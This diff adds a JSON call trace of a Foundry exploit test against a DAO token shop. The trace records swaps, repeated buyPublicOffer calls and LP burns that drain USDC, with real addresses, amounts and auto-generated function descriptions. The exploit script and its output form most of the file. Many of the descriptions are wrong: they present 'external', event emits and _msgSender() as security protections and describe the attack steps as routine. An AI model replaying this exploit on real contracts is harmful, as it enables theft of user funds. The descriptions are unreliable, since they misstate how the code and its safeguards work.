@@ -1,0 +1,366 @@
+[
+    {
+        "id": "23756",
+        "args": "",
+        "original_code": "    function testExploit() external {\n        address[] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(USDC);\n        Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 4 * 1e17}(\n            1, path, address(this), block.timestamp\n        );\n        USDC.approve(address(shop), type(uint256).max);\n        uint256 amount = USDC.balanceOf(address(this));\n        shop.buyPublicOffer(UF, amount);\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(USDC);\n        address[] memory adapters = new address[](0);\n        address[] memory pools = new address[](0);\n        UFT.burn(amount, tokens, adapters, pools);\n        amount = 1000 * 1e18;\n        shop.buyPublicOffer(UF, amount);\n        UFT.burn(amount, tokens, adapters, pools);\n\n        emit log_named_decimal_uint(\n            \"Attacker USDC balance after exploit\", USDC.balanceOf(address(this)), USDC.decimals()\n        );\n    }\n\n",
+        "description": "1. Core functions:\n   The `testExploit` function is designed to simulate an exploit scenario involving token swaps and purchases. It first swaps a specific amount of Ether (ETH) for another token (USDC) using a decentralized exchange router. After the swap, it approves a shop contract to spend the USDC tokens. Then, it buys a public offer using the USDC tokens and burns a portion of the tokens. This process is repeated with a different amount, and finally, the function emits an event to log the attacker's USDC balance after the exploit.\n\n2. Security mechanism:\n   The function uses several key security measures:\n   - `external`: This modifier ensures that the function can only be called from outside the contract, preventing internal misuse.\n   - `block.timestamp`: This is used to set a deadline for the token swap, ensuring that the transaction does not remain pending indefinitely.\n   - `approve`: This function is used to grant the shop contract permission to spend the USDC tokens, which is a standard security practice to control token access.\n   - `emit`: This is used to log the attacker's USDC balance after the exploit, providing transparency and traceability.\n\n3. Parameter Function:\n   - `path`: This is an array of addresses that specifies the token swap path, starting with WBNB and ending with USDC.\n   - `value`: This parameter specifies the amount of Ether (ETH) to be swapped, set to `4 * 1e17` (0.4 ETH).\n   - `amount`: This variable is used to store the balance of USDC tokens and later to specify the amount of tokens to be burned or used in the public offer purchase.\n   - `tokens`, `adapters`, `pools`: These arrays are used in the `burn` function to specify the tokens, adapters, and pools involved in the burning process.\n\n4. Return description:\n   The function does not return any value directly. Instead, it performs a series of actions:\n   - Swaps ETH for USDC tokens.\n   - Approves the shop contract to spend USDC tokens.\n   - Buys a public offer using USDC tokens.\n   - Burns a portion of the USDC tokens.\n   - Repeats the purchase and burning process with a different amount.\n   - Emits an event to log the attacker's USDC balance after the exploit.\n\nIn summary, the `testExploit` function simulates an exploit scenario by swapping ETH for USDC, approving and spending USDC tokens, and burning tokens. It uses security measures like `external`, `block.timestamp`, and `approve` to ensure controlled and transparent execution. The function does not return a value but performs a series of actions and logs the final USDC balance.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "401023",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "131535",
+        "args": "1, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1673475201 [1.673e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "23974",
+        "args": "",
+        "original_code": "",
+        "description": "",
+        "return_value": "Returned"
+    },
+    {
+        "id": "8062",
+        "args": "0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b, 400000000000000000 [4e17]",
+        "original_code": "    function transfer(address, uint256) public pure override returns (bool) {\n        revert(\"GT: transfer is prohibited\");\n    }\n\n    function transferFrom(\n        address,\n        address,\n        uint256\n    ) public pure override returns (bool) {\n        revert(\"GT: transferFrom is prohibited\");\n    }\n\n    /*----RECEIVE ETH------------------------------------*/\n\n    event Received(address indexed, uint256);\n\n    receive() external payable {\n        emit Received(msg.sender, msg.value);\n    }\n}\n",
+        "description": "1. **Core functions**:  \n   - The `transfer` and `transferFrom` functions are designed to prevent any token transfers. Instead of allowing transfers, they immediately stop execution and return an error message indicating that transfers are not allowed.  \n   - The `receive` function allows the contract to accept Ether (ETH) payments. When ETH is sent to the contract, it triggers an event called `Received` that logs the sender's address and the amount of ETH received.  \n\n2. **Security mechanism**:  \n   - Both `transfer` and `transferFrom` functions use the `revert` statement to ensure that any attempt to transfer tokens fails and provides a clear error message (\"GT: transfer is prohibited\" or \"GT: transferFrom is prohibited\"). This acts as a safeguard to prevent unauthorized or unintended token movements.  \n   - The `receive` function is marked as `payable`, meaning it can handle incoming ETH transactions. It emits an event to record the transaction details, which helps in tracking and auditing ETH transfers.  \n\n3. **Parameter Function**:  \n   - For `transfer` and `transferFrom`, the parameters (addresses and amounts) are not used because the functions always revert. They are included to match the expected interface of token transfer functions.  \n   - The `receive` function does not take any parameters. It automatically processes incoming ETH and uses `msg.sender` (the sender's address) and `msg.value` (the amount of ETH sent) to emit the `Received` event.  \n\n4. **Return description**:  \n   - Both `transfer` and `transferFrom` return `bool` (a true/false value) as part of their function signature, but they never actually return a value because they always revert.  \n   - The `receive` function does not return any value. Its purpose is to accept ETH and log the transaction details via the `Received` event.  \n\n**In summary**, this code is designed to block token transfers while allowing the contract to receive ETH. It uses `revert` to enforce the transfer prohibition and emits events to track incoming ETH transactions.",
+        "return_value": "true"
+    },
+    {
+        "id": "9796",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
+        "description": "1. Core functions:  \nThe `balanceOf` function is designed to check and return the balance of a specific account. It looks up the balance associated with the given account address and provides this information to the caller. This is a common function in token contracts to allow users or other contracts to query how many tokens a particular account holds.\n\n2. Security mechanism:  \nThe function uses the `view` modifier, which ensures that it does not modify the state of the contract. This means it only reads data and does not perform any actions that could change the contract's storage. Additionally, the `public` modifier allows the function to be called by anyone, making it accessible for external queries. The `virtual override` keywords indicate that this function can be overridden by derived contracts, providing flexibility for customization.\n\n3. Parameter Function:  \nThe function takes one parameter: `account`, which is of type `address`. This parameter specifies the account whose token balance is being queried. The function uses this address to look up the corresponding balance in the `_balances` mapping.\n\n4. Return description:  \nThe function returns a `uint256` value, which represents the token balance of the specified account. It directly retrieves this value from the `_balances` mapping, where the account address is used as the key. The returned value is the exact balance stored in the contract for that account.\n\nIn summary,  \nThe `balanceOf` function is a simple and secure way to query the token balance of a specific account. It uses a mapping to store balances and ensures read-only access with the `view` modifier. The `account` parameter specifies the address to check, and the function returns the corresponding balance as a `uint256` value.",
+        "return_value": "0"
+    },
+    {
+        "id": "2553",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "2279914196823333187850739 [2.279e24], 8149272002009749216942 [8.149e21], 1673475173 [1.673e9]"
+    },
+    {
+        "id": "534",
+        "args": "0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b",
+        "original_code": null,
+        "description": null,
+        "return_value": "8149672002009749216942 [8.149e21]"
+    },
+    {
+        "id": "63881",
+        "args": "111622391174831097929 [1.116e20], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "28739",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 111622391174831097929 [1.116e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "27993",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 111622391174831097929 [1.116e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1296",
+        "args": "0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b",
+        "original_code": null,
+        "description": null,
+        "return_value": "2279802574432158356752810 [2.279e24]"
+    },
+    {
+        "id": "553",
+        "args": "0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b",
+        "original_code": null,
+        "description": null,
+        "return_value": "2279802574432158356752810 [2.279e24]"
+    },
+    {
+        "id": "534",
+        "args": "0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b",
+        "original_code": null,
+        "description": null,
+        "return_value": "8149672002009749216942 [8.149e21]"
+    },
+    {
+        "id": "1296",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "111622391174831097929 [1.116e20]"
+    },
+    {
+        "id": "553",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "111622391174831097929 [1.116e20]"
+    },
+    {
+        "id": "25308",
+        "args": "SHOP: [0xCA49EcF7e7bb9bBc9D1d295384663F6BA5c0e366], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
+        "description": "1. **Core functions**:  \n   The `approve` function allows the caller (the owner of tokens) to give permission to another address (the `spender`) to spend a specific amount of tokens on their behalf. This is a common function in token contracts to enable delegated spending.\n\n2. **Security mechanism**:  \n   - The function is marked as `public`, meaning it can be called by anyone.  \n   - It uses `virtual` and `override` to allow for customization in derived contracts.  \n   - The `_approve` internal function is used to handle the actual approval logic, ensuring consistency and reducing code duplication.  \n   - The `_msgSender()` function is used to securely fetch the caller's address, protecting against potential vulnerabilities like reentrancy.  \n\n3. **Parameter Function**:  \n   - `spender`: The address of the account that is being granted permission to spend tokens.  \n   - `amount`: The maximum number of tokens the `spender` is allowed to spend.  \n\n4. **Return description**:  \n   The function always returns `true` to indicate that the approval was successful. This is a standard practice in ERC-20 token contracts to confirm the operation's completion.  \n\nIn summary, the `approve` function enables token owners to delegate spending rights to another address, ensuring security through internal checks and returning a confirmation of success.",
+        "return_value": "true"
+    },
+    {
+        "id": "24562",
+        "args": "SHOP: [0xCA49EcF7e7bb9bBc9D1d295384663F6BA5c0e366], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1296",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "111622391174831097929 [1.116e20]"
+    },
+    {
+        "id": "553",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "111622391174831097929 [1.116e20]"
+    },
+    {
+        "id": "71856",
+        "args": "0x2101e0F648A2b5517FD2C5D9618582E9De7a651A, 111622391174831097929 [1.116e20]",
+        "original_code": "    function buyPublicOffer(address _dao, uint256 _lpAmount)\n        external\n        nonReentrant\n        returns (bool)\n    {\n        require(\n            IFactory(factory).containsDao(_dao),\n            \"Shop: only DAO can sell LPs\"\n        );\n\n        PublicOffer memory publicOffer = publicOffers[_dao];\n\n        require(publicOffer.isActive, \"Shop: this offer is disabled\");\n\n        IERC20(publicOffer.currency).safeTransferFrom(\n            msg.sender,\n            _dao,\n            (_lpAmount * publicOffer.rate) / 1e18\n        );\n\n        address lp = IDao(_dao).lp();\n\n        bool b = ILP(lp).mint(msg.sender, _lpAmount);\n\n        require(b, \"Shop: mint error\");\n\n        return true;\n    }\n\n",
+        "description": "1. Core functions:  \nThis function allows a user to purchase a public offer of liquidity provider (LP) tokens from a specific decentralized autonomous organization (DAO). The user specifies the DAO they want to interact with and the amount of LP tokens they wish to buy. The function ensures that the DAO is valid, the offer is active, and then transfers the required payment in the specified currency to the DAO. Finally, it mints the requested LP tokens to the user's address.\n\n2. Security mechanism:  \n- **`nonReentrant`**: Prevents reentrancy attacks, ensuring the function cannot be called again before it completes.  \n- **`require` statements**: Validate conditions such as the DAO being registered, the offer being active, and the successful minting of LP tokens.  \n- **`safeTransferFrom`**: Safely transfers tokens from the user to the DAO, ensuring the operation is secure and error-free.  \n\n3. Parameter Function:  \n- **`_dao`**: The address of the DAO from which the user wants to buy LP tokens.  \n- **`_lpAmount`**: The amount of LP tokens the user wants to purchase.  \n\n4. Return description:  \nThe function returns `true` if all operations are successful, indicating that the purchase was completed without issues. If any step fails (e.g., invalid DAO, inactive offer, or minting error), the function will revert with an error message.  \n\nIn summary, this function enables users to securely buy LP tokens from a DAO's public offer, ensuring all conditions are met and operations are protected against common vulnerabilities.",
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "2690",
+        "args": "0x2101e0F648A2b5517FD2C5D9618582E9De7a651A",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "11586",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2101e0F648A2b5517FD2C5D9618582E9De7a651A, 111622391174831097929 [1.116e20]",
+        "original_code": "    function transferFrom(\n        address,\n        address,\n        uint256\n    ) public pure override returns (bool) {\n        revert(\"GT: transferFrom is prohibited\");\n    }\n\n    /*----RECEIVE ETH------------------------------------*/\n\n    event Received(address indexed, uint256);\n\n    receive() external payable {\n        emit Received(msg.sender, msg.value);\n    }\n}\n",
+        "description": "1. Core functions:\n   - The `transferFrom` function is designed to prevent the transfer of tokens from one address to another. It overrides a standard function but intentionally causes an error with a message indicating that this action is not allowed.\n   - The `receive` function allows the contract to accept Ether (the cryptocurrency of Ethereum) sent to it. When Ether is received, it triggers an event that logs the sender's address and the amount of Ether received.\n\n2. Security mechanism:\n   - The `transferFrom` function uses the `revert` statement to ensure that any attempt to transfer tokens is blocked, providing a clear message that this operation is prohibited.\n   - The `receive` function is marked as `external` and `payable`, which means it can only be called from outside the contract and can accept Ether. The `emit` statement is used to log the receipt of Ether, which helps in tracking and auditing transactions.\n\n3. Parameter Function:\n   - The `transferFrom` function takes three parameters: two addresses (the sender and the receiver) and a uint256 value (the amount of tokens to transfer). However, these parameters are not used because the function always reverts.\n   - The `receive` function does not take any explicit parameters. It implicitly uses `msg.sender` (the address sending the Ether) and `msg.value` (the amount of Ether sent) to log the transaction.\n\n4. Return description:\n   - The `transferFrom` function is supposed to return a boolean value indicating success or failure. However, it always reverts with an error message, so it never actually returns a value.\n   - The `receive` function does not return any value. Its purpose is to accept Ether and log the transaction details through an event.\n\nIn summary, the `transferFrom` function is a safeguard that prevents token transfers, while the `receive` function allows the contract to accept Ether and log the details of the transaction. Both functions include mechanisms to ensure security and transparency in their operations.",
+        "return_value": "true"
+    },
+    {
+        "id": "10834",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2101e0F648A2b5517FD2C5D9618582E9De7a651A, 111622391174831097929 [1.116e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2383",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000f887a2dac0dd432997c970bce597a94ead4a8c25"
+    },
+    {
+        "id": "31914",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 111622391174831097929 [1.116e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55104",
+        "args": "111622391174831097929 [1.116e20], [0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d], [], []",
+        "original_code": "    function burn(address _to, uint256 _amount)\n        external\n        onlyDao\n        returns (bool)\n    {\n        require(burnable, \"DAO: GT burning is disabled\");\n        _burn(_to, _amount);\n        return true;\n    }\n\n",
+        "description": "1. **Core functions:**  \n   The `burn` function is designed to permanently remove a specified amount of tokens from a specific address. This process is often referred to as \"burning\" tokens, which reduces the total supply of tokens in circulation. The function ensures that only the DAO (Decentralized Autonomous Organization) can execute this operation.\n\n2. **Security mechanism:**  \n   - The `onlyDao` modifier restricts access to this function, ensuring only the DAO can call it.  \n   - The `require` statement checks if burning is enabled (`burnable`). If not, it prevents the function from executing and returns an error message (\"DAO: GT burning is disabled\").  \n   - These measures protect against unauthorized or unintended token burns.\n\n3. **Parameter Function:**  \n   - `_to`: This is the address from which the tokens will be burned.  \n   - `_amount`: This specifies the number of tokens to be burned.  \n\n4. **Return description:**  \n   The function returns `true` if the burning process is successful. This indicates that the specified tokens were successfully removed from the address and the operation was completed as intended.\n\n**In summary,**  \nThe `burn` function allows the DAO to permanently remove a specific amount of tokens from a given address, provided that burning is enabled. It includes security checks to ensure only authorized entities can perform this action and returns `true` upon successful execution.",
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "43625",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 942578426828411838 [9.425e17], [0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d], [], []",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "55",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1296",
+        "args": "0x2101e0F648A2b5517FD2C5D9618582E9De7a651A",
+        "original_code": null,
+        "description": null,
+        "return_value": "90112290593429476877123 [9.011e22]"
+    },
+    {
+        "id": "553",
+        "args": "0x2101e0F648A2b5517FD2C5D9618582E9De7a651A",
+        "original_code": null,
+        "description": null,
+        "return_value": "90112290593429476877123 [9.011e22]"
+    },
+    {
+        "id": "23939",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 84937901105459450533735 [8.493e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "23193",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 84937901105459450533735 [8.493e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "41556",
+        "args": "0x2101e0F648A2b5517FD2C5D9618582E9De7a651A, 1000000000000000000000 [1e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "690",
+        "args": "0x2101e0F648A2b5517FD2C5D9618582E9De7a651A",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "6786",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2101e0F648A2b5517FD2C5D9618582E9De7a651A, 1000000000000000000000 [1e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2101e0F648A2b5517FD2C5D9618582E9De7a651A, 1000000000000000000000 [1e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "383",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000f887a2dac0dd432997c970bce597a94ead4a8c25"
+    },
+    {
+        "id": "25914",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000000 [1e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "31204",
+        "args": "1000000000000000000000 [1e21], [0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d], [], []",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "21725",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 993245927691696464 [9.932e17], [0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d], [], []",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "55",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1296",
+        "args": "0x2101e0F648A2b5517FD2C5D9618582E9De7a651A",
+        "original_code": null,
+        "description": null,
+        "return_value": "6174389487970026343388 [6.174e21]"
+    },
+    {
+        "id": "553",
+        "args": "0x2101e0F648A2b5517FD2C5D9618582E9De7a651A",
+        "original_code": null,
+        "description": null,
+        "return_value": "6174389487970026343388 [6.174e21]"
+    },
+    {
+        "id": "4039",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6132687214908647539840 [6.132e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3293",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6132687214908647539840 [6.132e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1296",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "90070588320368098073575 [9.007e22]"
+    },
+    {
+        "id": "553",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "90070588320368098073575 [9.007e22]"
+    },
+    {
+        "id": "3076",
+        "args": "",
+        "original_code": "    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n",
+        "description": "1. **Core functions**:  \n   The `decimals()` function is a simple utility that returns the number of decimal places used by a token. In this case, it always returns `18`, which is a common standard for many tokens (like Ethereum's ERC-20 tokens). This helps define how divisible the token is, ensuring consistency in calculations and transactions.\n\n2. **Security mechanism**:  \n   The function uses `public view` to allow anyone to read its value without modifying the contract state. The `virtual` keyword means it can be overridden by derived contracts, and `override` indicates it is replacing a function from a parent contract. These modifiers ensure flexibility and compatibility with inherited contracts.\n\n3. **Parameter Function**:  \n   This function does not take any parameters. It is designed to be straightforward and provide a fixed value without requiring any input.\n\n4. **Return description**:  \n   The function always returns the value `18`, representing the number of decimal places for the token. This is a hardcoded value, so the output is consistent and predictable.\n\nIn summary, the `decimals()` function is a simple, read-only utility that returns `18` to indicate the token's decimal precision. It is secure, flexible, and does not require any input parameters.",
+        "return_value": "18"
+    },
+    {
+        "id": "2336",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18"
+    }
+]
